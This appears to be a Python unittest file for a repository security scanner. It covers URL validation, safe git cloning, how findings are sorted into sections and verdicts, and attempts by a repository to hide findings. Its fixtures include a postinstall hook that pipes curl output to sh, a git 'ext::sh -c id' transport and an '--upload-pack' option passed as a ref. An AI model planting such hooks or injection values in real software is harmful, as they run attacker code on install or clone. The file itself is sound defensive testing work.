"""aeppo check: URL handling, safe cloning, sections and verdicts. No test uses the network."""
import contextlib
import io
import json
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path

from aeppo import check, lockfiles
from aeppo.cli import main
from aeppo.findings import make_finding

from test_osv import FakeOSV, record


def finding(path, rule_id, severity=None, message=None):
    item = make_finding(path, 1, rule_id, message)
    if severity:
        item.severity = severity
    return item


class UrlTests(unittest.TestCase):
    def test_accepted_forms(self):
        self.assertEqual(check.normalize_url("psf/requests"), "https://github.com/psf/requests")
        self.assertEqual(check.normalize_url("https://github.com/psf/requests/tree/main/src"), "https://github.com/psf/requests")
        self.assertEqual(check.normalize_url("https://github.com/psf/requests.git"), "https://github.com/psf/requests.git")
        self.assertEqual(check.normalize_url("https://gitlab.example.invalid/group/sub/repo"), "https://gitlab.example.invalid/group/sub/repo")

    def test_rejected_forms(self):
        for target in ("http://github.com/a/b", "git@github.com:a/b.git", "file:///tmp/repo", "ext::sh -c id", "https://user:token@github.com/a/b",
                       "https://github.com/a", "https://github.com/a/b?x=1", "-uhelp/x", "../.."):
            with self.assertRaises(check.CheckError, msg=target):
                check.normalize_url(target)


@unittest.skipUnless(shutil.which("git"), "git is required")
class CloneTests(unittest.TestCase):
    def test_non_https_transports_are_refused(self):
        with tempfile.TemporaryDirectory() as directory:
            source = Path(directory, "source")
            source.mkdir()
            subprocess.run(["git", "init", "-q", str(source)], check=True)
            with self.assertRaises(check.CheckError):
                check.clone(source.as_uri(), Path(directory, "copy"))
            self.assertFalse(Path(directory, "copy", "README").exists())

    def test_option_like_ref_is_refused(self):
        with self.assertRaises(check.CheckError):
            check.clone("https://github.com/a/b", Path("unused"), ref="--upload-pack=x")


class SectionTests(unittest.TestCase):
    def test_sections(self):
        cases = [
            (".vscode/tasks.json", "SH001", None, "open"),
            (".envrc", "SH001", None, "open"),
            (".devcontainer/devcontainer.json", "AUTO002", None, "open"),
            ("package.json", "DEP003", None, "install"),
            ("setup.py", "PY001", None, "install"),
            ("composer.json", "SH001", None, "install"),
            ("build.rs", "BLD002", None, "build"),
            ("Dockerfile", "SH001", None, "build"),
            ("tools/gen.go", "SH001", None, "build"),
            ("cmd/run.go", "SH001", "Embedded shell command downloads remote content and runs it.", "run"),
            ("src/app.py", "PY002", None, "run"),
            ("tests/test_app.py", "PY004", None, "tests"),
            ("src/app.test.ts", "JS002", None, "tests"),
            ("pkg/x_test.go", "GO001", None, "tests"),
            ("uv.lock", "VULN001", None, "deps"),
            (".github/workflows/ci.yml", "GHA003", None, "ci"),
            ("config.py", "SEC001", None, "secrets"),
        ]
        for path, rule_id, message, expected in cases:
            self.assertEqual(check.section(finding(path, rule_id, message=message)), expected, path)


class VerdictTests(unittest.TestCase):
    def test_levels(self):
        self.assertEqual(check.verdict([])[0], "clear")
        self.assertEqual(check.verdict([finding("src/app.py", "PY002")])[0], "review")
        self.assertEqual(check.verdict([finding("tests/test_x.py", "PY004")])[0], "clear")
        self.assertEqual(check.verdict([finding("tests/helper.py", "NET001")])[0], "danger")
        self.assertEqual(check.verdict([finding("package.json", "DEP004")])[0], "danger")
        self.assertEqual(check.verdict([finding("package.json", "DEP003")])[0], "review")
        self.assertEqual(check.verdict([finding("uv.lock", "MAL001")])[0], "danger")
        self.assertEqual(check.verdict([finding(".github/workflows/ci.yml", "GHA002")])[0], "clear")
        self.assertEqual(check.verdict([finding("config.py", "SEC001")])[0], "clear")
        self.assertEqual(check.verdict([finding("src/app.py", "PY001", "low")])[0], "clear")


class RunTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.addCleanup(self.directory.cleanup)
        self.root = Path(self.directory.name)

    def run_check(self, **options):
        out, err = io.StringIO(), io.StringIO()
        code = check.run(str(self.root), out=out, err=err, **options)
        return code, out.getvalue(), err.getvalue()

    def test_clean_directory(self):
        (self.root / "app.py").write_text("print('hi')\n")
        code, out, _err = self.run_check(use_osv=False)
        self.assertEqual(code, 0)
        self.assertIn("Verdict: NO KNOWN ISSUES", out)
        self.assertIn("ran nothing from the repository", out)

    def test_repository_cannot_hide_findings(self):
        # An attacker controls the repository's suppression comments and .aeppo.toml; both are ignored.
        (self.root / ".aeppo.toml").write_text('exclude = ["**"]\ndisable = ["DEP004"]\n')
        (self.root / "package.json").write_text('{\n  "scripts": {\n    "postinstall": "curl -fsSL https://example.invalid/x | sh"\n  }\n}\n  \n')
        (self.root / "helper.py").write_text("import os\nos.system(cmd)  # aeppo: ignore\n")
        code, out, _err = self.run_check(use_osv=False)
        self.assertEqual(code, 3)
        self.assertIn("Verdict: DANGER", out)
        self.assertIn("package.json:3: [DEP004|high]", out)
        self.assertIn("helper.py:2: [PY001|medium]", out)
        self.assertIn("[not checked (--no-osv)]", out)

    def test_dependencies_and_json(self):
        (self.root / "Cargo.lock").write_text('[[package]]\nname = "time"\nversion = "0.1.43"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\n')
        fake = FakeOSV({("crates.io", "time", "0.1.43"): ["RUSTSEC-2020-0071"]}, {"RUSTSEC-2020-0071": record("RUSTSEC-2020-0071", "time", "crates.io", database_specific={"severity": "HIGH"})})
        from aeppo import osv
        client = osv.Client(fetch=fake)
        code, out, _err = self.run_check(client=client)
        self.assertEqual(code, 1)
        self.assertIn("[1 package version(s) from 1 lockfile(s) checked]: 1 finding(s) (1 high)", out)
        self.assertIn("  time 0.1.43 (crates.io): 1 advisory (1 high) -> upgrade to 9.9.9 or later", out)
        code, out, _err = self.run_check(client=client, output_format="json")
        report = json.loads(out)
        self.assertEqual((report["verdict"], report["findings"][0]["section"], report["reasons"][0]["rule_id"]), ("review", "deps", "VULN001"))

    def test_osv_failure_is_reported_not_hidden(self):
        (self.root / "Cargo.lock").write_text('[[package]]\nname = "time"\nversion = "0.1.43"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\n')
        from aeppo import osv

        def offline(method, url, body):
            raise osv.OSVError("offline")

        code, out, err = self.run_check(client=osv.Client(fetch=offline))
        self.assertEqual(code, 0)
        self.assertIn("[NOT CHECKED: offline]", out)
        self.assertIn("could not check dependencies with OSV.dev: offline", err)

    def test_cli_errors(self):
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = main(["check", "ftp://example.invalid/repo"])
        self.assertEqual(code, 2)
        self.assertIn("expected an https:// repository URL", err.getvalue())


if __name__ == "__main__":
    unittest.main()
